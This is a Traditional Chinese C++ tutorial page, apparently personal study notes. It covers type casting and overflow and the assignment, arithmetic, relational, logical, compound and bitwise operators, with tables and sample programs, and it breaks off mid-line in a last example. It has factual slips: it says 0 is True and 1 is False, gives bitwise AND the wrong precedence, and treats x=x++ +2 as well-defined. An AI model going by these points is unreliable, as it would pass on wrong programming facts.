<h5 id="以下敘述將long型態的g變數轉為short，將造成溢位"><a href="#以下敘述將long型態的g變數轉為short，將造成溢位" class="headerlink" title="以下敘述將long型態的g變數轉為short，將造成溢位"></a>以下敘述將long型態的g變數轉為short，將造成溢位</h5><blockquote>
<p>long g=32769;<br>short h;<br>h=(short) g;<br>cout &lt;&lt; h;<br>輸出為-32767[color=#b494]</p>
</blockquote>
<h4 id="範例程式-2"><a href="#範例程式-2" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">short</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="type">long</span> b;</span><br><span class="line">    b=a;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> b1=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    cout&lt;&lt;b1&lt;&lt;endl;</span><br><span class="line">    <span class="type">short</span> b2;</span><br><span class="line">    b2=(<span class="type">short</span>) b1;</span><br><span class="line">    cout&lt;&lt;b2&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> c=<span class="number">20</span>;</span><br><span class="line">    <span class="type">short</span> d;</span><br><span class="line">    d=(<span class="type">short</span>) c;</span><br><span class="line">    cout&lt;&lt;d&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> e=<span class="number">3.4f</span>;</span><br><span class="line">    <span class="type">short</span> f;</span><br><span class="line">    f=(<span class="type">short</span>) e;</span><br><span class="line">    cout&lt;&lt;f&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> g=<span class="number">32769</span>;</span><br><span class="line">    <span class="type">short</span> h;</span><br><span class="line">    h=(<span class="type">short</span>) g;</span><br><span class="line">    cout&lt;&lt;h&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
10
a
97
20
3
-32767
</code></pre><h1 id="運算子"><a href="#運算子" class="headerlink" title="運算子"></a>運算子</h1><p><code>所謂運算子(Operator)，指的是可以對運算元(Operand)執行特定功能的特殊符號</code></p>
<blockquote>
<p>運算子一般分為五大類:<br>指派(Assignment)運算子<br>算數(Arithmetic)運算子<br>邏輯  (Logical) 運算子<br>關係(Relational)運算子<br>位元  (Bitwise) 運算子<br>[color=#b65656]</p>
</blockquote>
<h4 id="每種運算子又可再細分為"><a href="#每種運算子又可再細分為" class="headerlink" title="每種運算子又可再細分為"></a>每種運算子又可再細分為</h4><ul>
<li><strong>一元(Unary)運算子&gt;&gt;只需要一個運算元就可操作</strong></li>
<li><strong>二元(Binary)運算子&gt;&gt;需要兩個運算才可操作</strong></li>
</ul>
<h4 id="優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序"><a href="#優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序" class="headerlink" title="==優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序=="></a>==優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序==</h4><h4 id="結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序"><a href="#結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序" class="headerlink" title="==結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序=="></a>==結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序==</h4><h3 id="指派運算子-Assignment-Operator"><a href="#指派運算子-Assignment-Operator" class="headerlink" title="指派運算子(Assignment Operator)"></a>指派運算子(Assignment Operator)</h3><p><code>指派運算子的符號為(=)，其作用為將運算符號右邊運算式的值指派給運算符號左邊的運算元</code></p>
<h5 id="EX"><a href="#EX" class="headerlink" title="EX:"></a>EX:</h5><blockquote>
<p>int sum=0,a=3,b=5;<br>sum=a+b;//將a+b指派給sum[color=#b34]</p>
</blockquote>
<p><strong><em><font color="#a026">上述與數學的等號是不同的，所以不要懷疑為何0=8<br>其次是不能將常數放在指派運算子的左邊</em></strong>&lt;/font&gt;</p>
<h5 id="EX-1"><a href="#EX-1" class="headerlink" title="EX:"></a>EX:</h5><blockquote>
<p>8=x;//不合法敘述<br>x=8//合法敘述<br>[color=#f53]</p>
</blockquote>
<h3 id="算數運算子-Arithmetic-Operator"><a href="#算數運算子-Arithmetic-Operator" class="headerlink" title="算數運算子(Arithmetic Operator)"></a>算數運算子(Arithmetic Operator)</h3><p><code>算術運算子用來執行一般數學運算</code></p>
<h4 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h4><p>:::info</p>
<ul>
<li>正負數 (+/-)</li>
<li>加     (+)</li>
<li>減     (-)</li>
<li>乘     (*)</li>
<li>除     (/)</li>
<li>取餘數  (%)</li>
<li>遞增   (++)</li>
<li>遞減   (—)<br>:::</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">運算子</th>
<th style="text-align:center">定義</th>
<th style="text-align:center">優先順序</th>
<th style="text-align:center">結合率</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">++/—</td>
<td style="text-align:center">遞增/遞減</td>
<td style="text-align:center">1</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">+/-</td>
<td style="text-align:center">正負號，一元運算子</td>
<td style="text-align:center">2</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:center">乘法運算</td>
<td style="text-align:center">4</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">/</td>
<td style="text-align:center">除法運算(商的型態同被除數)</td>
<td style="text-align:center">4</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">%</td>
<td style="text-align:center">求餘數(Modulus)</td>
<td style="text-align:center">4</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">+/-</td>
<td style="text-align:center">加法/減法運算</td>
<td style="text-align:center">5</td>
<td style="text-align:center">由左而右</td>
</tr>
</tbody>
</table>
</div>
<h4 id="範例程式-3"><a href="#範例程式-3" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">5</span>,y=<span class="number">4</span>;</span><br><span class="line">    <span class="type">float</span> z=<span class="number">5</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1=&quot;</span>&lt;&lt;x+z&lt;&lt;endl; <span class="comment">//5+5</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2=&quot;</span>&lt;&lt;x-z&lt;&lt;endl; <span class="comment">//5-5</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3=&quot;</span>&lt;&lt;x*z&lt;&lt;endl; <span class="comment">//5*5</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4=&quot;</span>&lt;&lt;y/z&lt;&lt;endl; <span class="comment">//4/5取商 //這裡的z是浮點數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5=&quot;</span>&lt;&lt;x/y&lt;&lt;endl; <span class="comment">//5/4取商 //若不是浮點數不會輸出小數後位數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;6=&quot;</span>&lt;&lt;x%y&lt;&lt;endl; <span class="comment">//5/4取餘數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;7=&quot;</span>&lt;&lt;-x+y/z&lt;&lt;endl; <span class="comment">//-5+4/5</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;8=&quot;</span>&lt;&lt;x-y%y*z&lt;&lt;endl; <span class="comment">//5-4%4*5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果<br>1=10<br>2=0<br>3=25<br>4=0.8<br>5=1<br>6=1<br>7=-4.2<br>8=5<br>[color=#f99]</p>
</blockquote>
<p><font color="#f18"><strong>需要注意C/C++語言的算術運算子只有以上那些，若需要運算沒有運算子則需要運用到數學函式</strong></font><br>:::warning<br><strong>例如C++沒有次方運算子(^)與開根號<br>要算次方的話要使用到pow()函式</strong></p>
<blockquote>
<p>a=pow(3,2);//include<math.h>或<cmath>[color=#a77]</p>
</blockquote>
<p><strong>要算根號的話要使用到sqrt()函式</strong></p>
<blockquote>
<p>x=sqrt(9)//include<math.h>或<cmath>[color=#a77]<br>:::</p>
</blockquote>
<h3 id="遞增-及遞減"><a href="#遞增-及遞減" class="headerlink" title="遞增(++)及遞減(- -)"></a>遞增(++)及遞減(- -)</h3><p><code>這兩個運算子又分為前置與後置</code></p>
<h4 id="前置是在運算子之前"><a href="#前置是在運算子之前" class="headerlink" title="前置是在運算子之前"></a>前置是在運算子之前</h4><p>EX:</p>
<blockquote>
<p>a=1;<br>++a;<br>cout&lt;&lt;a&lt;&lt;endl;//2[color=#f90]</p>
</blockquote>
<h4 id="後置是運算子在運算元後"><a href="#後置是運算子在運算元後" class="headerlink" title="後置是運算子在運算元後"></a>後置是運算子在運算元後</h4><p>==不論 ++a,a++都是將值加1放回a，但是兩個執行結果還是有差異的==<br>EX:</p>
<blockquote>
<p>a=1;<br>b=++a;//先執行a=a+1;在執行b=a; 輸出 a=2 b=2[color=#a10]</p>
</blockquote>
<h4 id="和"><a href="#和" class="headerlink" title="和"></a>和</h4><blockquote>
<p>a=1;<br>b=a++;先執行b=a;在執行a=a+1; 輸出 a=2 b=1[color=#f20]</p>
</blockquote>
<p><strong>其a值均會加1，但b值會有差異，前置b值會得到+1的結果，後者能得到原a值</strong></p>
<h4 id="範例程式-4"><a href="#範例程式-4" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b,d,r,e;</span><br><span class="line">    b=++a;<span class="comment">//a=1+1=2=b</span></span><br><span class="line">    d=++a;<span class="comment">//此時a是2，a=2+1=d</span></span><br><span class="line">    e=a++;<span class="comment">//a還是2，e=a=2，2+1=3=a</span></span><br><span class="line">    r=a++;<span class="comment">//a現在是3，r=a=3，3+1=4=a</span></span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;e&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;r&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
2
3
3
4
</code></pre><h3 id="關係運算子-Relational-Operator-或稱比較運算子-Comparison-Operator"><a href="#關係運算子-Relational-Operator-或稱比較運算子-Comparison-Operator" class="headerlink" title="關係運算子(Relational Operator)或稱比較運算子(Comparison Operator)"></a>關係運算子(Relational Operator)或稱比較運算子(Comparison Operator)</h3><p><code>用於資料之間的大小比較的結果可得到int型別的1(True)或0(False)</code><br>EX:</p>
<blockquote>
<p>if(a==b);//比較ab是否相等[color=#d48]</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">運算子</th>
<th style="text-align:center">定義</th>
<th style="text-align:center">優先順序</th>
<th style="text-align:center">結合率</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">小於</td>
<td style="text-align:center">6</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">大於</td>
<td style="text-align:center">6</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">&lt;=</td>
<td style="text-align:center">小於等於</td>
<td style="text-align:center">6</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">&gt;=</td>
<td style="text-align:center">大於等於</td>
<td style="text-align:center">6</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">==</td>
<td style="text-align:center">等於</td>
<td style="text-align:center">7</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">!=</td>
<td style="text-align:center">不等於</td>
<td style="text-align:center">7</td>
<td style="text-align:center">由左而右</td>
</tr>
</tbody>
</table>
</div>
<h4 id="範例程式-5"><a href="#範例程式-5" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    a=<span class="number">7</span>&gt;<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//T</span></span><br><span class="line">    a=<span class="number">3</span>&gt;=<span class="number">7</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//F</span></span><br><span class="line">    b=<span class="number">7</span>;</span><br><span class="line">    c=<span class="number">3</span>;</span><br><span class="line">    a=b==c;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//F</span></span><br><span class="line">    b=<span class="number">7</span>;</span><br><span class="line">    c=<span class="number">3</span>;a=b!=c;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//T</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果<br>1<br>0<br>0<br>1<br>[color=#a08]</p>
</blockquote>
<h3 id="邏輯運算子-Logical-Operator"><a href="#邏輯運算子-Logical-Operator" class="headerlink" title="邏輯運算子(Logical Operator)"></a>邏輯運算子(Logical Operator)</h3><p><code>當同一個運算式要同時存在兩個以上比較運算子，每兩個比較運算子之間必須使用邏輯運算子連結</code><br>| 運算子 | 定義 | 優先順序 | 結合率 |<br>| :————-: | :———: | :—————-:| :—————:|<br>| ! | 一元邏輯補數運算(NOT) | 2 | 由右而左 |<br>| &amp; | 完全評估的AND運算 | 8 | 由左而右 |<br>| ^ | 完全評估的XOR運算 | 8 | 由左而右 |<br>|| | 完全評估的OR運算 | 8 | 由左而右 |<br>| &amp;&amp; | 快捷的AND運算 | 9 | 由左而右 |<br>|||| 快捷的OR運算 | 9 | 由左而右 |</p>
<h4 id="範例程式-6"><a href="#範例程式-6" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,x,y;</span><br><span class="line">    x=<span class="number">5</span>;</span><br><span class="line">    y=<span class="number">4</span>;</span><br><span class="line">    a=x&gt;y &amp; y==<span class="number">3</span>; <span class="comment">//T &amp; F = F</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    b=x&gt;<span class="number">3</span> || y&lt;<span class="number">5</span>;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl; <span class="comment">//T | T = T</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果<br>0<br>1<br>[color=#c38]</p>
<hr>
<h5 id="完全評估系列的運算子-一定會把兩個關係運算子拿來運算"><a href="#完全評估系列的運算子-一定會把兩個關係運算子拿來運算" class="headerlink" title="完全評估系列的運算子==一定會把兩個關係運算子拿來運算=="></a>完全評估系列的運算子==一定會把兩個關係運算子拿來運算==</h5><p><strong><em>相反地</em></strong></p>
<h4 id="快捷系列的運算子-會先算出第一個關係運算子的值"><a href="#快捷系列的運算子-會先算出第一個關係運算子的值" class="headerlink" title="快捷系列的運算子==會先算出第一個關係運算子的值=="></a>快捷系列的運算子==會先算出第一個關係運算子的值==</h4><p><strong>如果這個值已經可以決定出整個運算式的結果</strong><br><strong>==快捷系統的運算子就不會對第二個關係運算子進行運算==</strong><br>EX:<br>boolean1=(3&gt;7)&amp;(5&gt;2);<br>boolean2=(3&gt;7)&amp;&amp;(5&gt;2);//比boolean1更快完成運算<br>[color=#f49]</p>
</blockquote>
<h2 id="範例實作"><a href="#範例實作" class="headerlink" title="範例實作"></a>範例實作</h2><p>:::danger<br>1.若有一數學式，判斷x是否滿足1&lt;x&lt;=6，請轉換C/C++敘述<br>2.若有一數學式，同時判斷4個變數是否滿足(a1/a2)=(b1/b2)，請轉換C/C ++敘述<br>3.(a1/a2)=(b1/b2)!=(c1/c2)又如何表示<br>(記得要自己打過程式，題目沒有標準答案der)<br>:::</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第1題</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    x=x&gt;<span class="number">1</span> &amp; x&lt;=<span class="number">6</span>;</span><br><span class="line">    cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第二題</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a1,a2,b1,b2;</span><br><span class="line">    <span class="type">int</span> A;</span><br><span class="line">    cin &gt;&gt; a1;</span><br><span class="line">    cin &gt;&gt; a2;</span><br><span class="line">    cin &gt;&gt; b1;</span><br><span class="line">    cin &gt;&gt; b2;</span><br><span class="line">  A=(a1/a2) == (b1/b2);</span><br><span class="line">  cout&lt;&lt;A; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第3題</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a1,a2,b1,b2,c1,c2;</span><br><span class="line">    cin &gt;&gt; a1;</span><br><span class="line">    cin &gt;&gt; a2;</span><br><span class="line">    cin &gt;&gt; b1;</span><br><span class="line">    cin &gt;&gt; b2;</span><br><span class="line">    cin &gt;&gt; c1;</span><br><span class="line">    cin &gt;&gt; c2;</span><br><span class="line"><span class="keyword">if</span>((a1/a2)==(b1/b2)!=(c1/c2))&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;T&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;F&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="複合指派運算子"><a href="#複合指派運算子" class="headerlink" title="複合指派運算子"></a>複合指派運算子</h3><p><code>結合指派與算術、關係、邏輯運算子</code></p>
<p><strong><em>這是C/C++特有的運算子</em></strong></p>
<h5 id="EX-2"><a href="#EX-2" class="headerlink" title="EX:"></a>EX:</h5><blockquote>
<p>sum=sum+5;<br>又等於<br>sum+=5;[color=#c87]</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">運算子</th>
<th style="text-align:center">定義</th>
<th style="text-align:center">優先順序</th>
<th style="text-align:center">結合率</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">=</td>
<td style="text-align:center">指派設定內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">+=</td>
<td style="text-align:center">相加後再設定內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">-=</td>
<td style="text-align:center">相減後再設定內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:center">相乘後再設定內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">/=</td>
<td style="text-align:center">相除後再設定內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">&amp;=</td>
<td style="text-align:center">AND運算後再設定內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:center">=</td>
<td style="text-align:center">OR運算後再設定內容</td>
<td style="text-align:center">11</td>
<td>由右而左</td>
</tr>
<tr>
<td style="text-align:center">^=</td>
<td style="text-align:center">XOR運算後再設定內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由右而左</td>
</tr>
</tbody>
</table>
</div>
<hr>
<h3 id="位元操作運算子-Bitwise-Operator"><a href="#位元操作運算子-Bitwise-Operator" class="headerlink" title="位元操作運算子(Bitwise Operator)"></a>位元操作運算子(Bitwise Operator)</h3><p><code>位元(Bitwise)操作運算子是將所運算的整數，先轉為二進制，在逐位元進行運算</code><br><strong>可分為</strong></p>
<blockquote>
<p>位移(shift)運算子與布林運算子<br>位移運算子是逐位元向左或是向右移<br>布林運算子則可以逐位元進行布林運算[color=#a347]</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">運算子</th>
<th style="text-align:center">定義</th>
<th style="text-align:center">優先順序</th>
<th style="text-align:center">結合率</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">~</td>
<td style="text-align:center">對各位元進行補數運算</td>
<td style="text-align:center">2</td>
<td style="text-align:center">由右而左</td>
</tr>
<tr>
<td style="text-align:center">&lt;&lt;</td>
<td style="text-align:center">考慮正負位元的向左位元</td>
<td style="text-align:center">5</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">&gt;&gt;</td>
<td style="text-align:center">考慮正負位元的向右位元</td>
<td style="text-align:center">5</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">位元AND運算</td>
<td style="text-align:center">2</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:center"></td>
<td style="text-align:center">位元OR運算</td>
<td style="text-align:center">8</td>
<td>由左而右</td>
</tr>
<tr>
<td style="text-align:center">^</td>
<td style="text-align:center">位元XOR運算</td>
<td style="text-align:center">8</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">&lt;&lt;=</td>
<td style="text-align:center">向左位移之後再指派內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由左而右</td>
</tr>
<tr>
<td style="text-align:center">&gt;&gt;=</td>
<td style="text-align:center">向右位移之後再指派內容</td>
<td style="text-align:center">11</td>
<td style="text-align:center">由左而右</td>
</tr>
</tbody>
</table>
</div>
<h4 id="數位邏輯幫大家整理一下"><a href="#數位邏輯幫大家整理一下" class="headerlink" title="數位邏輯幫大家整理一下"></a>數位邏輯幫大家整理一下</h4><pre><code> 0 &gt;&gt;True
 1 &gt;&gt;Falst
</code></pre><hr>
<p>:::success<br>     AND  &gt;&gt;遇 0 則 0<br>     NAND &gt;&gt;遇 0 則 1<br>     OR   &gt;&gt;遇 1 則 1<br>     NOR  &gt;&gt;遇 1 則 0<br>     XOR  &gt;&gt;相同為 0 不同為 1<br>     NXOR &gt;&gt;相同為 1 不同為 0<br>:::</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    i=<span class="number">1</span>; <span class="comment">//0000 0001</span></span><br><span class="line">    i=~i;<span class="comment">//1111 1110取2補數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1=&quot;</span>&lt;&lt;i&lt;&lt;endl;<span class="comment">//-2(10進制)</span></span><br><span class="line">    i=<span class="number">6</span>;   <span class="comment">//i=00000110</span></span><br><span class="line">    i=i&lt;&lt;<span class="number">2</span>;<span class="comment">//i=00011000</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2=&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    i=i&gt;&gt;<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3=&quot;</span>&lt;&lt;i&lt;&lt;endl;<span class="comment">//i=00000011</span></span><br><span class="line">    i=<span class="number">3</span>;    <span class="comment">//i=00000011</span></span><br><span class="line">    j=<span class="number">2</span>;    <span class="comment">//j=00000010</span></span><br><span class="line">    k=i &amp; j;<span class="comment">//k=00000010//遇0則0</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4=&quot;</span>&lt;&lt;k&lt;&lt;endl;</span><br><span class="line">    k=i | j;<span class="comment">//k=00000011//遇1則1</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5=&quot;</span>&lt;&lt;k&lt;&lt;endl;</span><br><span class="line">    k=i ^ j;<span class="comment">//k=00000001//相同為0不同為1</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;6=&quot;</span>&lt;&lt;k&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1=-2
2=24
3=3
4=2
5=3
6=1
</code></pre><hr>
<h3 id="運算子的優先順序"><a href="#運算子的優先順序" class="headerlink" title="運算子的優先順序"></a>運算子的優先順序</h3><p><code>同一敘述若同時有多個運算子，此時需定義運算子的優先順序</code></p>
<blockquote>
<p>x=a+b<em>c;<br>由以上各運算子的「優先順序」可知，乘號(</em>)的優先順序是第4而加號(+)則是第5</p>
</blockquote>
<p><strong>x=(a+(b*c));//和上述結果相同</strong></p>
<h4 id="同理"><a href="#同理" class="headerlink" title="同理"></a>同理</h4><blockquote>
<p>x=a&gt;b &amp; b&gt;z;</p>
<h4 id="同義"><a href="#同義" class="headerlink" title="同義"></a>同義</h4><p>x=(a&gt;b) &amp; (b&gt;z);</p>
</blockquote>
<h4 id="下面式子左右結果是相同的"><a href="#下面式子左右結果是相同的" class="headerlink" title="下面式子左右結果是相同的"></a>下面式子左右結果是相同的</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">x=x+++2;</th>
<th style="text-align:center">x=(x++)+2;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">x=x+y*2+z++;</td>
<td style="text-align:center">x=((x+(y*2))+(z++));</td>
</tr>
<tr>
<td style="text-align:center">z=x&gt;2 &amp; y&gt;3;</td>
<td style="text-align:center">z=((x&gt;2)&amp;(y&gt;3));</td>
</tr>
</tbody>
</table>
</div>
<h3 id="範例程式-7"><a href="#範例程式-7" class="headerlink" title="範例程式"></a>範例程式</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">int</span> x,y,z;</span><br><span class="line">    x=<span class="number">2</span>;</span><br><span class="line">    x=x++<span class="number">+2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;X1=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    x=<span class="number">1</span>;y=<span class="number">3</span>;z=<span 